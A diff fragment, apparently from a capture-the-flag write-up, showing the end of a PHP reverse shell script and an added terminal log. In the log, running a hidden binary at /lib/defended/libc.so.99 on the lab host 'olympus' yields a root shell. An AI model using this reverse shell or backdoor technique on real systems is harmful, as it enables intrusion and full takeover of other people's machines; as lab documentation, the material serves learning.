@@ -388,6 +388,16 @@ fclose($sock);
 for($x=0;$x<=2;$x++) fclose($pipes[x]);
 proc_close($proc);
 ?>
-
+```
+```
+zeus@olympus:~$ uname -a; w;/lib/defended/libc.so.99
+Linux olympus 5.4.0-109-generic #123-Ubuntu SMP Fri Apr 8 09:10:54 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
+ 13:44:59 up  1:34,  2 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+zeus     pts/2    10.10.239.74     13:05   19:55   0.11s  0.11s -bash
+zeus     pts/4    10.10.77.8       13:37    3.00s  0.03s  0.00s w
+# id
+uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),1000(zeus)
+# 
 ```
 
